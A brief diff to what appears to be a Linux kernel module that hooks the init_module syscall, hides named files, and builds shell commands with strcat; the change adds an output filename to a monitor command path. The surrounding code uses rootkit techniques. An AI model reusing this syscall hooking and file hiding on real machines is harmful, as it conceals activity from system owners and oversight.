@@ -37,6 +37,7 @@ asmlinkage long hooked_init_module(void __user *  umod,  unsigned long len,
 /*************** What file we gonna hide ********************/
 char *INEXISTFILE = "HIDEAFILEINKERNEL";
 char *INEXISTMONITOR = "SETMONITORPROGRAM";
+char *MONITOR_RESULT = "monitoroutput.txttmp";
 char *hidfiles[256];
 char *monitor = NULL;
 char *workdir = NULL;
@@ -249,6 +250,7 @@ static int callMonitor(char *type, const char *msg){
     strcat(m, "'>>");
     strcat(m, workdir);
     strcat(m, "/");
+    strcat(m, MONITOR_RESULT);
     strcat(m, "/");
     
     printk("call = [%s] [%s]\n", monitor, m);
